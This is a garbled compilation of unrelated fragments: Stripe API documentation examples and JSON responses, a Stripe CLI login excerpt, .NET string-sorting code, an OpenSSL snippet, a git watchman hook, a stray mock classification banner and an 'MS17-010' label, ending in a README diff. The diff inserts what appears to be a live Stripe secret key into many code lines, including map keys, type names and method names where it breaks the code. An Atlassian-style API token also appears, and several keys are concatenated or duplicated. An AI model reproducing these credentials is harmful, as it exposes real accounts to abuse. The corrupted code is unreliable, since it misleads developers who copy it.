stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.checkout.Session.list_line_items(
  "cs_test_a1enSAC01IA3Ps2vL32mNoWKMCNmmfUGTeEeHXI5tLCvyFNGsdG2UNA7mr",
)
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.checkout.Session.expire(
  "cs_test_a1Ae6ClgOkjygKwrf9B3L6ITtUuZW4Xx9FivL6DZYoYFdfAefQxsYpJJd3",
)
{
  "id": "cn_1MxvRqLkdIwHu7ixY0xbUcxk",
  "object": "credit_note",
  "amount": 1099,
  "amount_shipping": 0,
  "created": 1681750958,
  "currency": "usd",
  "customer": "cus_NjLgPhUokHubJC",
  "customer_balance_transaction": null,
  "discount_amount": 0,
  "discount_amounts": [],
  "invoice": "in_1MxvRkLkdIwHu7ixABNtI99m",
  "lines": {
    "object": "list",
    "data": [
      {
        "id": "cnli_1MxvRqLkdIwHu7ixFpdhBFQf",
        "object": "credit_note_line_item",
        "amount": 1099,
        "amount_excluding_tax": 1099,
        "description": "T-shirt",
        "discount_amount": 0,
        "discount_amounts": [],
        "invoice_line_item": "il_1MxvRlLkdIwHu7ixnkbntxUV",
        "livemode": false,
        "quantity": 1,
        "tax_amounts": [],
        "tax_rates": [],
        "type": "invoice_line_item",
        "unit_amount": 1099,
        "unit_amount_decimal": "1099",
        "unit_amount_excluding_tax": "1099"
      }
    ],
    "has_more": false,
    "url": "/v1/credit_notes/cn_1MxvRqLkdIwHu7ixY0xbUcxk/lines"
  },
  "livemode": false,
  "memo": null,
  "metadata": {},
  "number": "C9E0C52C-0036-CN-01",
  "out_of_band_amount": null,
  "pdf": "https://pay.stripe.com/credit_notes/acct_1M2JTkLkdIwHu7ix/test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LF9Oak9FOUtQNFlPdk52UXhFd2Z4SU45alpEd21kd0Y4LDcyMjkxNzU50200cROQsSK2/pdf?s=ap",
  "reason": null,
  "refund": null,
  "shipping_cost": null,
  "status": "issued",
  "subtotal": 1099,
  "subtotal_excluding_tax": 1099,
  "tax_amounts": [],
  "total": 1099,
  "total_excluding_tax": 1099,
  "type": "pre_payment",
  "voided_at": null
}
The

stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq_key"
stripe.CreditNote.preview(
  invoice="in_1Nn8cq2eZvKYlo2CNDpusCKy",
  lines=[
    {
      "type": "invoice_line_item",
      "invoice_line_item": "il_1Nn8cq2eZvKYlo2CidbpuBZa",
      "quantity": 1,
    },
  ],
)
credit_note = stripe.CreditNote.retrieve('cn_1Nn8cq2eZvKYlo2C6rIUxWuM')
lines = credit_note.lines.list(limit=5)
RESPONSE
{
  "id": "cn_1Nn7fB2eZvKYlo2CuJ0wZBlA",
  "object": "credit_note",
  "amount": 1451,
  "amount_shipping": 0,
  "created": 1693952641,
  "currency": "usd",
  "customer": "cus_9s6XKzkNRiz8i3",
  "customer_balance_transaction": null,
  "discount_amount": 0,
  "discount_amounts": [],
  "effective_at": null,
  "invoice": "in_1Nn7fB2eZvKYlo2C7meA67Xp",
  "lines": {
    "object": "list",
    "data": [
      {
        "id": "cnli_1Nn7fB2eZvKYlo2Cp8nLMci9",
        "object": "credit_note_line_item",
        "amount": 951,
        "amount_excluding_tax": 951,
        "description": "My First Invoice Item (created for API docs)",
        "discount_amount": 0,
        "discount_amounts": [],
        "invoice_line_item": "il_1Nn7fB2eZvKYlo2ChKG2H1tv",
        "livemode": false,
        "quantity": 1,
        "tax_amounts": [
          {
            "amount": 152,
            "inclusive": false,
            "tax_rate": "txr_1Nn7fB2eZvKYlo2CcbF7zzmD",
            "taxability_reason": null,
            "taxable_amount": 799
          }
        ],
        "tax_rates": [
          {
            "id": "txr_1Nn7fB2eZvKYlo2CcbF7zzmD",
            "object": "tax_rate",
            "active": true,
            "country": "DE",
            "created": 1693952641,
            "description": "VAT Germany",
            "display_name": "VAT",
            "effective_percentage": null,
            "inclusive": false,
            "jurisdiction": "DE",
            "livemode": false,
            "metadata": {},
            "percentage": 19,
            "state": null,
            "tax_type": "vat"
          }
        ],
        "type": "invoice_line_item",
        "unit_amount": null,
        "unit_amount_decimal": null,
        "unit_amount_excluding_tax": "951"
      },
      {
        "id": "cnli_1Nn7fB2eZvKYlo2C7OxQLHdz",
        "object": "credit_note_line_item",
        "amount": 500,
        "amount_excluding_tax": 500,
        "description": "Service credit",
        "discount_amount": 0,
        "discount_amounts": [],
        "livemode": false,
        "quantity": 1,
        "tax_amounts": [],
        "tax_rates": [],
        "type": "custom_line_item",
        "unit_amount": 500,
        "unit_amount_decimal": "500",
        "unit_amount_excluding_tax": "500"
      }
    ],
    "has_more": false,
    "url": "/v1/credit_notes/cn_1Nn7fB2eZvKYlo2CuJ0wZBlA/lines"
  },
  "livemode": false,
  "memo": null,
  "metadata": {},
  "number": "ABCD-1234-CN-01",
  "out_of_band_amount": null,
  "pdf": "https://pay.stripe.com/credit_notes/acct_1032D82eZvKYlo2C/cnst_123456789/pdf?s=ap",
  "reason": null,
  "refund": null,
  "shipping_cost": null,
  "status": "issued",
  "subtotal": 1451,
  "subtotal_excluding_tax": 1451,
  "tax_amounts": [
    {
      "amount": 152,
      "inclusive": false,
      "tax_rate": "txr_1Nn7fB2eZvKYlo2CcbF7zzmD",
      "taxability_reason": null,
      "taxable_amount": 799
    }
  ],
  "total": 1451,
  "total_excluding_tax": null,
  "type": "pre_payment",
  "voided_at": null
}
Retrieve
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.CreditNote.retrieve("cn_1MxvRqLkdIwHu7ixY0xbUcxk")

docker run --rm -it stripe/stripe-cli:latest
Log in to the CLI
Login and authenticate your Stripe user Account to generate a set of restricted keys. To learn more, see Stripe CLI keys and permissions.
Command Line


stripe login
Press the Enter key on your keyboard to complete the authentication process in your browser.
Output


Your pairing code is: enjoy-enough-outwit-win
This pairing code verifies your authentication with Stripe.
Press Enter to open the browser or visit https://dashboard.stripe.com/stripecli/confirm_auth?t=THQdJfL3x12udFkNorJL8OF1iFlN8Az1 (^C to quit)
Optionally, if you don’t want to use a browser, use the --interactive flag to authenticate with an existing API secret key or restricted key. This can be helpful when authenticating to the CLI without a browser, such as in a CI/CD pipeline.
Command Line


stripe login --interactive
Optionally, use the --api-key flag to specify your API secret key inline each time you send a request.
Command Line


stripe login --api-key sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh4...bxbcYsf8OF00CdDfT6Xq
ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069

curl -v https://mysite.atlassian.net --user me@example.com:my-api-token
Private key
SHA256:TvOWY3mZWlr9uMgny0PtyVdWFzAfKO98UgFlMzgP+ZA=
Added now by 6309304695
IP

  
// Set the current culture to Danish in Denmark.
  Thread.CurrentThread.CurrentCulture = new CultureInfo("da-DK");
  Console.WriteLine("Current culture: {0}", 
                    CultureInfo.CurrentCulture.Name);
  Console.WriteLine("Comparison of {0} with {1}: {2}", 
                    str1, str2, String.Compare(str1, str2));
  Console.WriteLine("Comparison of {0} with {1}: {2}\n", 
                    str2, str3, String.Compare(str2, str3));
  
  // Set the current culture to English in the U.S.
  Thread.CurrentThread.CurrentCulture = new CultureInfo("en-US");
  Console.WriteLine("Current culture: {0}", 
                    CultureInfo.CurrentCulture.Name);
  Console.WriteLine("Comparison of {0} with {1}: {2}", 
                    str1, str2, String.Compare(str1, str2));
  Console.WriteLine("Comparison of {0} with {1}: {2}\n", 
                    str2, str3, String.Compare(str2, str3));
  
  // Perform an ordinal comparison.
  Console.WriteLine("Ordinal comparison");
  Console.WriteLine("Comparison of {0} with {1}: {2}", 
                    str1, str2, 
                    String.Compare(str1, str2, StringComparison.Ordinal));
  Console.WriteLine("Comparison of {0} with {1}: {2}", 
                    str2, str3, 
                    String.Compare(str2, str3, StringComparison.Ordinal));

  // Perform a word sort using the current (en-US) culture.
  string[] current = new string[strings.Length]; 
  strings.CopyTo(current, 0); 
  Array.Sort(current, StringComparer.CurrentCulture);

  // Perform a word sort using the invariant culture.
  string[] invariant = new string[strings.Length];
  strings.CopyTo(invariant, 0); 
  Array.Sort(invariant, StringComparer.InvariantCulture);

  // Perform an ordinal sort.
  string[] ordinal = new string[strings.Length];
  strings.CopyTo(ordinal, 0); 
  Array.Sort(ordinal, StringComparer.Ordinal);

  // Perform a string sort using the current culture.
  string[] stringSort = new string[strings.Length];
  strings.CopyTo(stringSort, 0); 
  Array.Sort(stringSort, new SCompare());

  // Display array values
  Console.WriteLine("{0,13} {1,13} {2,15} {3,13} {4,13}\n", 
                    "Original", "Word Sort", "Invariant Word", 
                    "Ordinal Sort", "String Sort");
  for (int ctr = 0; ctr < strings.Length; ctr++)
     Console.WriteLine("{0,13} {1,13} {2,15} {3,13} {4,13}", 
                       strings[ctr], current[ctr], invariant[ctr], 
                       ordinal[ctr], stringSort[ctr] );          

  // Display the values of the array.
  Console.WriteLine( "The original string array:");
  PrintIndexAndValues(stringArray);

  // Set the CurrentCulture to "en-US".
  Thread.CurrentThread.CurrentCulture = new CultureInfo("en-US");
  // Sort the values of the array.
  Array.Sort(stringArray);

  // Display the values of the array.
  Console.WriteLine("After sorting for the culture \"en-US\":");
  PrintIndexAndValues(stringArray);

  // Set the CurrentCulture to "da-DK".
  Thread.CurrentThread.CurrentCulture = new CultureInfo("da-DK");
  // Sort the values of the Array.
  Array.Sort(stringArray);

  // Display the values of the array.
  Console.WriteLine("After sorting for the culture \"da-DK\":");
  PrintIndexAndValues(stringArray);

  // Display the values of the array.
  Console.WriteLine( "The original string array:");
  PrintIndexAndValues(stringArray);

  // Set the CurrentCulture to "en-US".
  Thread.CurrentThread.CurrentCulture = new CultureInfo("en-US");
  // Sort the values of the array.
  Array.Sort(stringArray);

  // Display the values of the array.
  Console.WriteLine("After sorting for the culture \"en-US\":");
  PrintIndexAndValues(stringArray);

  // Set the CurrentCulture to "da-DK".
  Thread.CurrentThread.CurrentCulture = new CultureInfo("da-DK");
  // Sort the values of the Array.
  Array.Sort(stringArray);

  // Display the values of the array.
  Console.WriteLine("After sorting for the culture \"da-DK\":");
  PrintIndexAndValues(stringArray);

  string s3 = "co\u00ADoperative";
  FindInString(s3, "\u00AD", StringComparison.CurrentCulture);
  FindInString(s3, "\u00AD", StringComparison.Ordinal);

  Console.Write("Ordinal comparison -- ");
  Console.WriteLine("Position of '{0}' in {1}: {2}", ch, str,
                    str.IndexOf(ch));
  
  foreach (var cultureName in cultureNames) {
     ci = CultureInfo.CreateSpecificCulture(cultureName).CompareInfo;
     Console.Write("{0} cultural comparison -- ", cultureName);
     Console.WriteLine("Position of '{0}' in {1}: {2}", ch, str,
                       ci.IndexOf(str, ch));
  }

  string filePath = "file://c:/notes.txt";
  
  Console.WriteLine("Culture-sensitive test for equality:");
  if (! TestForEquality(filePath, StringComparison.CurrentCultureIgnoreCase))
     Console.WriteLine("Access to {0} is allowed.", filePath);
  else
     Console.WriteLine("Access to {0} is not allowed.", filePath);
  
  Console.WriteLine("\nOrdinal test for equality:");
  if (! TestForEquality(filePath, StringComparison.OrdinalIgnoreCase))
     Console.WriteLine("Access to {0} is allowed.", filePath);
  else
     Console.WriteLine("Access to {0} is not allowed.", filePath);

  string substring = str.Substring(0, position);  
  return substring.Equals("FILE", cmp);

  // Define three versions of the same word. 
  string s1 = "sống";        // create word with U+1ED1
  string s2 = "s\u00F4\u0301ng";
  string s3 = "so\u0302\u0301ng";

  TestForEquality(s1, s2, s3);      
  sw.WriteLine();

  // Normalize and compare strings using each normalization form.
  foreach (string formName in Enum.GetNames(typeof(NormalizationForm)))
  {
     sw.WriteLine("Normalization {0}:\n", formName); 
     NormalizationForm nf = (NormalizationForm) Enum.Parse(typeof(NormalizationForm), formName);
     string[] sn = NormalizeStrings(nf, s1, s2, s3);
     TestForEquality(sn);           
     sw.WriteLine("\n");                                        
  }
  
  sw.Close();   

       _github-challenge-God-s-time-travel-org.scpf-foundation-roblox

    blocksize = EVP_CIPHER_CTX_get_block_size(rl->enc_ctx);
    (EVP_CIPHER_CTX_get_mode(rl->enc_ctx) == EVP_CIPH_CBC_MODE)) {
    blksz = EVP_CIPHER_CTX_get_block_size(rl->enc_ctx);
    assert(blksz >= 0);

git clone git://git.openssl.org/openssl.git

git clone https://github.com/openssl/openssl.git

git clone https://github.com/yourname/openssl.git

[sigma-3-6309304695-patch-1.zip](https://github.com/6309304695/sigma-9/files/13983744/sigma-3-6309304695-patch-1.zip)
[sigma-3-Owner.tar.gz](https://github.com/6309304695/sigma-9/files/13983745/sigma-3-Owner.tar.gz)
![BSM 2](https://github.com/6309304695/sigma-9/assets/117963165/37d91166-d0eb-488f-b63f-a290ac346791)
Added tunnel data # MS17-010
my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
    or die "open2() failed: $!\n" .
    "Falling back to scanning...\n";

# In the query expression below we're asking for names of files that
# changed since $time but were not transient (ie created after
# $time but no longer exist).
#
# To accomplish this, we're using the "since" generator to use the
# recency index to select candidate nodes and "fields" to limit the
# output to file names only. Then we're using the "expression" term to
# further constrain the results.
#
# The category of transient files that we want to ignore will have a
# creation clock (cclock) newer than $time_t value and will also not
# currently exist.

my $query = <<"	END";
	["query", "$git_work_tree", {
		"since": $time,
		"fields": ["name"],
		"expression": ["not", ["allof", ["since", $time, "cclock"], ["not", "exists"]]]
	}]
END

print CHLD_IN $query;
close CHLD_IN;
my $response = do {local $/; <CHLD_OUT>};

die "Watchman: command returned no output.\n" .
    "Falling back to scanning...\n" if $response eq "";
die "Watchman: command returned invalid output: $response\n" .
    "Falling back to scanning...\n" unless $response =~ /^\{/;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

my $o = $json_pkg->new->utf8->decode($response);

if ($retry > 0 and $o->{error} and $o->{error} =~ m/unable to resolve root .* directory (.*) is not watched/) {
	print STDERR "Adding '$git_work_tree' to watchman's watch list.\n";
	$retry--;
	qx/watchman watch "$git_work_tree"/;
	die "Failed to make watchman watch '$git_work_tree'.\n" .
	    "Falling back to scanning...\n" if $? != 0;

	# Watchman will always return all files on the first query so
	# return the fast "everything is dirty" flag to git and do the
	# Watchman query just to get it over with now so we won't pay
	# the cost in git to look up each individual file.
	print "/\0";
	eval { launch_watchman() };
	exit 0;
}

die "Watchman: $o->{error}.\n" .
    "Falling back to scanning...\n" if $o->{error};

binmode STDOUT, ":utf8";
local $, = "\0";
print @{$o->{files}};
DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA
HANDLE VIA
BYEMAN TALENT-KEYHOLE -TOP SECRET
CONTROL SYSTEMS JOINTLY
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
---
 README.md | 214 +++++++++++++++++++++++++++++++++++++++++++++---------
 1 file changed, 180 insertions(+), 34 deletions(-)

diff --git a/README.md b/README.md
index 093e3cc..ac03fed 100644
--- a/README.md
+++ b/README.md
@@ -56,6 +56,152 @@ Secret rsa3072
    C0FCF8642D830C53246211400346653590B3795B
 Stripe-Signature:
t=1492774577,
v1=5257a869e7ecebeda32affa62cdca3fa51cad7e77a0e56ff536d0ce8e108d8bd,
v0=6ffbb59b2300aae63f272406069a9788598b792a944a07aba816edb039989a39
            bxzcxpxk8h87z1k7bzk86xn5aj47intu@example.net
+curl -G https://api.stripe.com/v1/apps/secrets/find \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:" \
+  -d name=my-api-key \
+  -d "scope[type]"=account
+  curl https://api.stripe.com/v1/issuing/tokens/intok_1MzDbE2eZvKYlo2C26a98MDg \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:" \
+  -d status=active
+RESPONSE
+{
+  "id": "intok_1MzDbE2eZvKYlo2C26a98MDg",
+  "object": "issuing.token",
+  "card": "ic_1MytUz2eZvKYlo2CZCn5fuvZ",
+  "created": 1682059060,
+  "device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG",
+  "last4": "2424",
+  "livemode": false,
+  "status": "active",
+  "token_reference_id": "DNITHE002424242424242424",
+  "token_requestor_name": "apple_pay",
+  "token_service_provider": "visa",
+  "updated": 1682059060,
+  "wallet_account_id": null,
+  "wallet_provider": "apple_pay"
+}
+Retrieve an issuing token
+
+Retrieves an Issuing Token object.
+Parameters
+
+No parameters.
+Returns
+
+Returns an Issuing Token object if a valid identifier was provided.
+GET 
+/v1/issuing/tokens/:id
+Server-side language
+
+curl https://api.stripe.com/v1/issuing/tokens/intok_1MzDbE2eZvKYlo2C26a98MDg \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:"
+RESPONSE
+{
+  "id": "intok_1MzDbE2eZvKYlo2C26a98MDg",
+  "object": "issuing.token",
+  "card": "ic_1MytUz2eZvKYlo2CZCn5fuvZ",
+  "created": 1682059060,
+  "device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG",
+  "last4": "2424",
+  "livemode": false,
+  "status": "active",
+  "token_reference_id": "DNITHE002424242424242424",
+  "token_requestor_name": "apple_pay",
+  "token_service_provider": "visa",
+  "updated": 1682059060,
+  "wallet_account_id": null,
+  "wallet_provider": "apple_pay"
+}
+List all issuing tokens for card
+
+Lists all Issuing Token objects for a given card.
+Parameters
+
+
+card
+string
+Required
+The Issuing card identifier to list tokens for.
+
+created
+object
+Select Issuing tokens that were created during the given date interval.
+Show child parameters
+
+status
+enum
+Select Issuing tokens with the given status.
+Possible enum values
+active
+Token is provisioned and usable for payments.
+deleted
+Terminal state. Token can no longer be used.
+requested
+Token has been requested to be provisioned, but has not completed the activation process.
+suspended
+Token temporarily cannot be used for payments.
+More parameters
+Expand all
+
+
+ending_before
+string
+
+limit
+integer
+
+starting_after
+string
+Returns
+
+A dictionary with a data property that contains an array of up to limit tokens, starting after token starting_after. Each entry in the array is a separate Issuing Token object. If no more tokens are available, the resulting array will be empty.
+GET 
+/v1/issuing/tokens
+Server-side language
+
+curl -G https://api.stripe.com/v1/issuing/tokens \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:" \
+  -d limit=3 \
+  -d card=ic_1MytUz2eZvKYlo2CZCn5fuvZ
+RESPONSE
+{
+  "object": "list",
+  "url": "/v1/issuing/tokens",
+  "has_more": false,
+  "data": [
+    {
+      "id": "intok_1MzDbE2eZvKYlo2C26a98MDg",
+      "object": "issuing.token",
+      "card": "ic_1MytUz2eZvKYlo2CZCn5fuvZ",
+      "created": 1682059060,
+      "device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG",
+      "last4": "2424",
+      "livemode": false,
+      "status": "active",
+      "token_reference_id": "DNITHE002424242424242424",
+      "token_requestor_name": "apple_pay",
+      "token_service_provider": "visa",
+      "updated": 1682059060,
+      "wallet_account_id": null,
+      "wallet_provider": "apple_pay"
+    }
+    {...}
+    {...}
+  ],
+}
+curl -X POST https://api.stripe.com/v1/terminal/connection_tokens \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:"
+RESPONSE
+{
+  "object": "terminal.connection_token",
+  "secret": "pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV"
+}
+{
+  "object": "terminal.connection_token",
+  "secret": "pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV"
+}
+sk_test_4eC39HqLyjWDarjtT1zdp7dc	On the server side: Must be secret and stored securely in your web or mobile app’s server-side code (such as in an environment variable or credential management system) to call Stripe APIs. Don’t expose this key on a website or embed it in a mobile application.
+Publishable	pk_test_TYooMQauvdEDq54NiTphI7jx
 
 --header X-WKS-Loop=webkey.example.net \
 --from webkey@example.net --send
@@ -1739,7 +1885,7 @@ params := &stripe.CustomerParams{
 
 c, err := customer.New(params)
 params := &stripe.PaymentIntentListParams{
-	Customer: stripe.String(customer.ID),
+	Customer: stripe.String(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),
 }
 
 i := paymentintent.List(params)
@@ -1758,7 +1904,7 @@ for i.Next() {
 	// alternatively you can access values via e.Data.Object["resource_name_based_on_type"].(map[string]interface{})["resource_property_name"]
 
 	// access previous attributes via e.GetPreviousValue("resource_name_based_on_type", "pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV")
-	// alternatively you can access values via e.Data.PrevPreviousAttributes["resource_name_based_on_type"].(map[string]interface{})["resource_property_name"]
+	// alternatively you can access values via e.Data.PrevPreviousAttributes["resource_name_based_on_type"].(map[string]interface{})["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"]
 }
 params := &stripe.CustomerParams{
 	Description:      stripe.String("Stripe Developer"),
@@ -1791,7 +1937,7 @@ for i.Next() {
 	// alternatively you can access values via e.Data.Object["resource_name_based_on_type"].(map[string]interface{})["resource_property_name"]
 
 	// access previous attributes via e.GetPreviousValue("resource_name_based_on_type", "pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV")
-	// alternatively you can access values via e.Data.PrevPreviousAttributes["resource_name_based_on_type"].(map[string]interface{})["resource_property_name"]
+	// alternatively you can access values via e.Data.PrevPreviousAttributes["resource_name_based_on_type"].(map[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]interface{})["resource_property_name"]
 }
 Alternatively, you can use the event.Data.Raw property to unmarshal to the appropriate struct.
 
@@ -1864,10 +2010,10 @@ import (
 stripe.Key = "sk_key"
 
 // Set backend (optional, useful for mocking)
-// stripe.SetBackend("api", backend)
+// stripe.SetBackend("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", backend)
 
 // Create
-resource, err := $resource$.New(&stripe.$Resource$Params{})
+resource, err := $resource$.New(&stripe.$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$Params{})
 
 // Get
 resource, err = $resource$.Get(id, &stripe.$Resource$Params{})
@@ -1881,7 +2027,7 @@ resourceDeleted, err := $resource$.Del(id, &stripe.$Resource$Params{})
 // List
 i := $resource$.List(&stripe.$Resource$ListParams{})
 for i.Next() {
-	resource := i.$Resource$()
+	resource := i.$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$()
 }
 
 if err := i.Err(); err != nil {
@@ -1898,7 +2044,7 @@ import (
 
 // Setup
 sc := &client.API{}
-sc.Init("sk_key", nil) // the second parameter overrides the backends used if needed for mocking
+sc.Init("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", nil) // the second parameter overrides the backends used if needed for mocking
 
 // Create
 $resource$, err := sc.$Resource$s.New(&stripe.$Resource$Params{})
@@ -2407,7 +2553,7 @@ To pass undocumented parameters to Stripe using stripe-go you need to use the Ad
 		Email: stripe.String("jenny.rosen@example.com")
 	}
 
-	params.AddExtra("secret_feature_enabled", "true")
+	params.AddExtra("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", "true")
 	params.AddExtra("secret_parameter[pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV]","primary value")
 	params.AddExtra("secret_parameter[pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV]","secondary value")
 
@@ -2425,7 +2571,7 @@ secret_feature_enabled, _ := string(rawData["secret_feature_enabled"].(pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV))
 
 secret_parameter, ok := rawData["secret_parameter"].(map[string]interface{})
 if ok {
-	primary := secret_parameter["primary"].(string)
+	primary := secret_parameter["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"].(string)
 	secondary := secret_parameter["secondary"].(string)
 } 
 Webhook signing
@@ -2436,7 +2582,7 @@ Testing Webhook signing
 
 You can use stripe.webhook.GenerateTestSignedPayload to mock webhook events that come from Stripe:
 
-payload := map[string]interface{}{
+payload := map[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]interface{}{
 	"id":          "evt_test_webhook",
 	"object":      "event",
 	"api_version": stripe.APIVersion,
@@ -2448,7 +2594,7 @@ payloadBytes, err := json.Marshal(payload)
 signedPayload := webhook.GenerateTestSignedPayload(&webhook.UnsignedPayload{Payload: payloadBytes, Secret: testSecret})
 event, err := webhook.ConstructEvent(signedPayload.Payload, signedPayload.Header, signedPayload.Secret)
 
-if event.ID == payload["id"] {
+if event.ID == payload["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"] {
 	// Do something with the mocked signed event
 } else {
 	// Handle invalid event payload
@@ -2665,7 +2811,7 @@ stripe.Token.create(
 )
 
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Token.retrieve("tok_1N3T00LkdIwHu7ixt44h1F8k")
 
@@ -2673,10 +2819,10 @@ stripe.Token.retrieve("tok_1N3T00LkdIwHu7ixt44h1F8k")
 
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.treasury.financial_accounts.update(
-  "{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}}",
+  "{{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}}",
   {"metadata": {"key": "value"}},
   {"stripe_account": "{{'acct_1OR5ePGF83d3fsgW'
 'acct_1OR9pdQD5Hu9t7xk'
@@ -2713,7 +2859,7 @@ client.treasury.financial_accounts.update(
 
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.treasury.financial_accounts.create(
   {
@@ -2740,7 +2886,7 @@ client.treasury.financial_accounts.create(
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.treasury.FinancialAccount.create(
   supported_currencies=["usd"],
@@ -2876,7 +3022,7 @@ stripe.treasury.FinancialAccount.create(
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.treasury.FinancialAccount.create(
   supported_currencies=["usd"],
@@ -2926,14 +3072,14 @@ stripe.treasury.FinancialAccount.create(
 }
 
 curl https://api.stripe.com/v1/treasury/financial_accounts/{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}} \
-  -u "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq:" \
+  -u "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:" \
   -H "Stripe-Account: {{'acct_1OR5ePGF83d3fsgW'
 'acct_1OR9pdQD5Hu9t7xk'
 'acct_1ORB1MBOdjLENdyb'}}" \
-  -d "metadata[key]"=value
+  -d "metadata[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]"=value
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.treasury.financial_accounts.update(
   "{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}}",
